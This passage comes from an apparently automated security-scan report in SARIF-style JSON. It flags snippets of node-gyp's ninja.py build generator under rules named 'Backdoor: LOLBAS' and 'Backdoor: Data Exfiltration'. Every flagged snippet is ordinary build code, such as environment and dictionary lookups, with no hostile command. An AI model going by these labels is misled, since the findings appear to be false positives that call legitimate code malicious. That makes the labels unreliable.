                    "text": "        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n",
                    "rendered": {
                      "text": "        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n",
                      "markdown": "`        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 846,
                  "startColumn": 67,
                  "endLine": 847,
                  "snippet": {
                    "text": "                basename = os.path.split(path)[1]\n                src = self.GypPathToNinja(path, env)\n                dst = self.GypPathToNinja(\n                    os.path.join(to_copy[\"destination\"], basename), env\n                )\n                outputs += self.ninja.build(dst, \"copy\", src, order_only=prebuild)\n                if self.is_mac_bundle:\n                    # gyp has mac_bundle_resources to copy things into a bundle's\n",
                    "rendered": {
                      "text": "                basename = os.path.split(path)[1]\n                src = self.GypPathToNinja(path, env)\n                dst = self.GypPathToNinja(\n                    os.path.join(to_copy[\"destination\"], basename), env\n                )\n                outputs += self.ninja.build(dst, \"copy\", src, order_only=prebuild)\n                if self.is_mac_bundle:\n                    # gyp has mac_bundle_resources to copy things into a bundle's\n",
                      "markdown": "`                basename = os.path.split(path)[1]\n                src = self.GypPathToNinja(path, env)\n                dst = self.GypPathToNinja(\n                    os.path.join(to_copy[\"destination\"], basename), env\n                )\n                outputs += self.ninja.build(dst, \"copy\", src, order_only=prebuild)\n                if self.is_mac_bundle:\n                    # gyp has mac_bundle_resources to copy things into a bundle's\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 838,
                  "startColumn": 11,
                  "endLine": 838,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n            for path in to_copy[\"files\"]:\n                # Normalize the path so trailing slashes don't confuse us.\n",
                    "rendered": {
                      "text": "            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n            for path in to_copy[\"files\"]:\n                # Normalize the path so trailing slashes don't confuse us.\n",
                      "markdown": "`            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n            for path in to_copy[\"files\"]:\n                # Normalize the path so trailing slashes don't confuse us.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 836,
                  "startColumn": 11,
                  "endLine": 836,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n",
                    "rendered": {
                      "text": "        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n",
                      "markdown": "`        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 695,
                  "startColumn": 7,
                  "endLine": 695,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        mac_bundle_resources,\n        extra_mac_bundle_resources,\n    ):\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n",
                    "rendered": {
                      "text": "        mac_bundle_resources,\n        extra_mac_bundle_resources,\n    ):\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n",
                      "markdown": "`        mac_bundle_resources,\n        extra_mac_bundle_resources,\n    ):\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 7,
                  "endLine": 650,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        self, actions, extra_sources, prebuild, extra_mac_bundle_resources\n    ):\n        # Actions cd into the base directory.\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for action in actions:\n            # First write out a rule for the action.\n",
                    "rendered": {
                      "text": "        self, actions, extra_sources, prebuild, extra_mac_bundle_resources\n    ):\n        # Actions cd into the base directory.\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for action in actions:\n            # First write out a rule for the action.\n",
                      "markdown": "`        self, actions, extra_sources, prebuild, extra_mac_bundle_resources\n    ):\n        # Actions cd into the base directory.\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for action in actions:\n            # First write out a rule for the action.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2937,
                  "startColumn": 51,
                  "endLine": 2937,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        target_dicts\n    )\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if gyp.common.GetFlavor(params) == \"win\":\n        target_list, target_dicts = MSVSUtil.ShardTargets(target_list, target_dicts)\n        target_list, target_dicts = MSVSUtil.InsertLargePdbShims(\n",
                    "rendered": {
                      "text": "        target_dicts\n    )\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if gyp.common.GetFlavor(params) == \"win\":\n        target_list, target_dicts = MSVSUtil.ShardTargets(target_list, target_dicts)\n        target_list, target_dicts = MSVSUtil.InsertLargePdbShims(\n",
                      "markdown": "`        target_dicts\n    )\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if gyp.common.GetFlavor(params) == \"win\":\n        target_list, target_dicts = MSVSUtil.ShardTargets(target_list, target_dicts)\n        target_list, target_dicts = MSVSUtil.InsertLargePdbShims(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2937,
                  "startColumn": 24,
                  "endLine": 2937,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        target_dicts\n    )\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if gyp.common.GetFlavor(params) == \"win\":\n        target_list, target_dicts = MSVSUtil.ShardTargets(target_list, target_dicts)\n        target_list, target_dicts = MSVSUtil.InsertLargePdbShims(\n",
                    "rendered": {
                      "text": "        target_dicts\n    )\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if gyp.common.GetFlavor(params) == \"win\":\n        target_list, target_dicts = MSVSUtil.ShardTargets(target_list, target_dicts)\n        target_list, target_dicts = MSVSUtil.InsertLargePdbShims(\n",
                      "markdown": "`        target_dicts\n    )\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if gyp.common.GetFlavor(params) == \"win\":\n        target_list, target_dicts = MSVSUtil.ShardTargets(target_list, target_dicts)\n        target_list, target_dicts = MSVSUtil.InsertLargePdbShims(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2879,
                  "startColumn": 44,
                  "endLine": 2879,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    if all_outputs:\n        master_ninja.newline()\n        master_ninja.build(\"all\", \"phony\", sorted(all_outputs))\n        master_ninja.default(generator_flags.get(\"default_target\", \"all\"))\n\n    master_ninja_file.close()\n\n",
                    "rendered": {
                      "text": "    if all_outputs:\n        master_ninja.newline()\n        master_ninja.build(\"all\", \"phony\", sorted(all_outputs))\n        master_ninja.default(generator_flags.get(\"default_target\", \"all\"))\n\n    master_ninja_file.close()\n\n",
                      "markdown": "`    if all_outputs:\n        master_ninja.newline()\n        master_ninja.build(\"all\", \"phony\", sorted(all_outputs))\n        master_ninja.default(generator_flags.get(\"default_target\", \"all\"))\n\n    master_ninja_file.close()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2794,
                  "startColumn": 52,
                  "endLine": 2794,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        # qualified_target is like: third_party/icu/icu.gyp:icui18n#target\n        build_file, name, toolset = gyp.common.ParseQualifiedTarget(qualified_target)\n\n        this_make_global_settings = data[build_file].get(\"make_global_settings\", [])\n        assert make_global_settings == this_make_global_settings, (\n            \"make_global_settings needs to be the same for all targets. \"\n            f\"{this_make_global_settings} vs. {make_global_settings}\"\n",
                    "rendered": {
                      "text": "        # qualified_target is like: third_party/icu/icu.gyp:icui18n#target\n        build_file, name, toolset = gyp.common.ParseQualifiedTarget(qualified_target)\n\n        this_make_global_settings = data[build_file].get(\"make_global_settings\", [])\n        assert make_global_settings == this_make_global_settings, (\n            \"make_global_settings needs to be the same for all targets. \"\n            f\"{this_make_global_settings} vs. {make_global_settings}\"\n",
                      "markdown": "`        # qualified_target is like: third_party/icu/icu.gyp:icui18n#target\n        build_file, name, toolset = gyp.common.ParseQualifiedTarget(qualified_target)\n\n        this_make_global_settings = data[build_file].get(\"make_global_settings\", [])\n        assert make_global_settings == this_make_global_settings, (\n            \"make_global_settings needs to be the same for all targets. \"\n            f\"{this_make_global_settings} vs. {make_global_settings}\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2320,
                  "startColumn": 30,
                  "endLine": 2320,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            for qualified_target in target_list\n        ]\n        shared_system_includes = None\n        if not generator_flags.get(\"ninja_use_custom_environment_files\", 0):\n            shared_system_includes = gyp.msvs_emulation.ExtractSharedMSVSSystemIncludes(\n                configs, generator_flags\n            )\n",
                    "rendered": {
                      "text": "            for qualified_target in target_list\n        ]\n        shared_system_includes = None\n        if not generator_flags.get(\"ninja_use_custom_environment_files\", 0):\n            shared_system_includes = gyp.msvs_emulation.ExtractSharedMSVSSystemIncludes(\n                configs, generator_flags\n            )\n",
                      "markdown": "`            for qualified_target in target_list\n        ]\n        shared_system_includes = None\n        if not generator_flags.get(\"ninja_use_custom_environment_files\", 0):\n            shared_system_includes = gyp.msvs_emulation.ExtractSharedMSVSSystemIncludes(\n                configs, generator_flags\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2310,
                  "startColumn": 39,
                  "endLine": 2310,
                  "endColumn": 44,
                  "snippet": {
                    "text": "            key_prefix = re.sub(r\"\\.HOST$\", \".host\", key_prefix)\n            wrappers[key_prefix] = os.path.join(build_to_root, value)\n\n    mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n    if mac_toolchain_dir:\n        wrappers[\"LINK\"] = \"export DEVELOPER_DIR='%s' &&\" % mac_toolchain_dir\n\n",
                    "rendered": {
                      "text": "            key_prefix = re.sub(r\"\\.HOST$\", \".host\", key_prefix)\n            wrappers[key_prefix] = os.path.join(build_to_root, value)\n\n    mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n    if mac_toolchain_dir:\n        wrappers[\"LINK\"] = \"export DEVELOPER_DIR='%s' &&\" % mac_toolchain_dir\n\n",
                      "markdown": "`            key_prefix = re.sub(r\"\\.HOST$\", \".host\", key_prefix)\n            wrappers[key_prefix] = os.path.join(build_to_root, value)\n\n    mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n    if mac_toolchain_dir:\n        wrappers[\"LINK\"] = \"export DEVELOPER_DIR='%s' &&\" % mac_toolchain_dir\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2264,
                  "startColumn": 43,
                  "endLine": 2264,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    readelf_host = \"readelf\"\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings = data[build_file].get(\"make_global_settings\", [])\n    build_to_root = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    wrappers = {}\n    for key, value in make_global_settings:\n",
                    "rendered": {
                      "text": "    readelf_host = \"readelf\"\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings = data[build_file].get(\"make_global_settings\", [])\n    build_to_root = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    wrappers = {}\n    for key, value in make_global_settings:\n",
                      "markdown": "`    readelf_host = \"readelf\"\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings = data[build_file].get(\"make_global_settings\", [])\n    build_to_root = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    wrappers = {}\n    for key, value in make_global_settings:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2214,
                  "startColumn": 47,
                  "endLine": 2214,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    generate_compile_commands = generator_flags.get(\"compile_commands\", False)\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n",
                    "rendered": {
                      "text": "    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    generate_compile_commands = generator_flags.get(\"compile_commands\", False)\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n",
                      "markdown": "`    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    generate_compile_commands = generator_flags.get(\"compile_commands\", False)\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2213,
                  "startColumn": 28,
                  "endLine": 2213,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def GenerateOutputForConfig(target_list, target_dicts, data, params, config_name):\n    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    generate_compile_commands = generator_flags.get(\"compile_commands\", False)\n\n    # build_dir: relative path from source root to our output files.\n",
                    "rendered": {
                      "text": "def GenerateOutputForConfig(target_list, target_dicts, data, params, config_name):\n    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    generate_compile_commands = generator_flags.get(\"compile_commands\", False)\n\n    # build_dir: relative path from source root to our output files.\n",
                      "markdown": "`def GenerateOutputForConfig(target_list, target_dicts, data, params, config_name):\n    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    generate_compile_commands = generator_flags.get(\"compile_commands\", False)\n\n    # build_dir: relative path from source root to our output files.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2166,
                  "startColumn": 42,
                  "endLine": 2166,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        )\n\n    rule_name_suffix = _GetWinLinkRuleNameSuffix(embed_manifest)\n    use_separate_mspdbsrv = int(os.environ.get(\"GYP_USE_SEPARATE_MSPDBSRV\", \"0\")) != 0\n    dlldesc = \"LINK%s(DLL) $binary\" % rule_name_suffix.upper()\n    dllcmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n",
                    "rendered": {
                      "text": "        )\n\n    rule_name_suffix = _GetWinLinkRuleNameSuffix(embed_manifest)\n    use_separate_mspdbsrv = int(os.environ.get(\"GYP_USE_SEPARATE_MSPDBSRV\", \"0\")) != 0\n    dlldesc = \"LINK%s(DLL) $binary\" % rule_name_suffix.upper()\n    dllcmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n",
                      "markdown": "`        )\n\n    rule_name_suffix = _GetWinLinkRuleNameSuffix(embed_manifest)\n    use_separate_mspdbsrv = int(os.environ.get(\"GYP_USE_SEPARATE_MSPDBSRV\", \"0\")) != 0\n    dlldesc = \"LINK%s(DLL) $binary\" % rule_name_suffix.upper()\n    dllcmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2115,
                  "startColumn": 40,
                  "endLine": 2115,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        # VS 2015 uses 20% more working set than VS 2013 and can consume all RAM\n        # on a 64 GiB machine.\n        mem_limit = max(1, stat.ullTotalPhys // (5 * (2 ** 30)))  # total / 5GiB\n        hard_cap = max(1, int(os.environ.get(\"GYP_LINK_CONCURRENCY_MAX\", 2 ** 32)))\n        return min(mem_limit, hard_cap)\n    elif sys.platform.startswith(\"linux\"):\n        if os.path.exists(\"/proc/meminfo\"):\n",
                    "rendered": {
                      "text": "        # VS 2015 uses 20% more working set than VS 2013 and can consume all RAM\n        # on a 64 GiB machine.\n        mem_limit = max(1, stat.ullTotalPhys // (5 * (2 ** 30)))  # total / 5GiB\n        hard_cap = max(1, int(os.environ.get(\"GYP_LINK_CONCURRENCY_MAX\", 2 ** 32)))\n        return min(mem_limit, hard_cap)\n    elif sys.platform.startswith(\"linux\"):\n        if os.path.exists(\"/proc/meminfo\"):\n",
                      "markdown": "`        # VS 2015 uses 20% more working set than VS 2013 and can consume all RAM\n        # on a 64 GiB machine.\n        mem_limit = max(1, stat.ullTotalPhys // (5 * (2 ** 30)))  # total / 5GiB\n        hard_cap = max(1, int(os.environ.get(\"GYP_LINK_CONCURRENCY_MAX\", 2 ** 32)))\n        return min(mem_limit, hard_cap)\n    elif sys.platform.startswith(\"linux\"):\n        if os.path.exists(\"/proc/meminfo\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2088,
                  "startColumn": 30,
                  "endLine": 2088,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\ndef GetDefaultConcurrentLinks():\n    \"\"\"Returns a best-guess for a number of concurrent links.\"\"\"\n    pool_size = int(os.environ.get(\"GYP_LINK_CONCURRENCY\", 0))\n    if pool_size:\n        return pool_size\n\n",
                    "rendered": {
                      "text": "\ndef GetDefaultConcurrentLinks():\n    \"\"\"Returns a best-guess for a number of concurrent links.\"\"\"\n    pool_size = int(os.environ.get(\"GYP_LINK_CONCURRENCY\", 0))\n    if pool_size:\n        return pool_size\n\n",
                      "markdown": "`\ndef GetDefaultConcurrentLinks():\n    \"\"\"Returns a best-guess for a number of concurrent links.\"\"\"\n    pool_size = int(os.environ.get(\"GYP_LINK_CONCURRENCY\", 0))\n    if pool_size:\n        return pool_size\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2080,
                  "startColumn": 22,
                  "endLine": 2080,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\ndef CommandWithWrapper(cmd, wrappers, prog):\n    wrapper = wrappers.get(cmd, \"\")\n    if wrapper:\n        return wrapper + \" \" + prog\n    return prog\n",
                    "rendered": {
                      "text": "\n\ndef CommandWithWrapper(cmd, wrappers, prog):\n    wrapper = wrappers.get(cmd, \"\")\n    if wrapper:\n        return wrapper + \" \" + prog\n    return prog\n",
                      "markdown": "`\n\ndef CommandWithWrapper(cmd, wrappers, prog):\n    wrapper = wrappers.get(cmd, \"\")\n    if wrapper:\n        return wrapper + \" \" + prog\n    return prog\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2052,
                  "startColumn": 50,
                  "endLine": 2052,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n\n    # Relative path from source root to our output files.  e.g. \"out\"\n    return os.path.normpath(os.path.join(generator_dir, output_dir))\n",
                    "rendered": {
                      "text": "    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n\n    # Relative path from source root to our output files.  e.g. \"out\"\n    return os.path.normpath(os.path.join(generator_dir, output_dir))\n",
                      "markdown": "`    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n\n    # Relative path from source root to our output files.  e.g. \"out\"\n    return os.path.normpath(os.path.join(generator_dir, output_dir))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2052,
                  "startColumn": 23,
                  "endLine": 2052,
                  "endColumn": 28,
                  "snippet": {
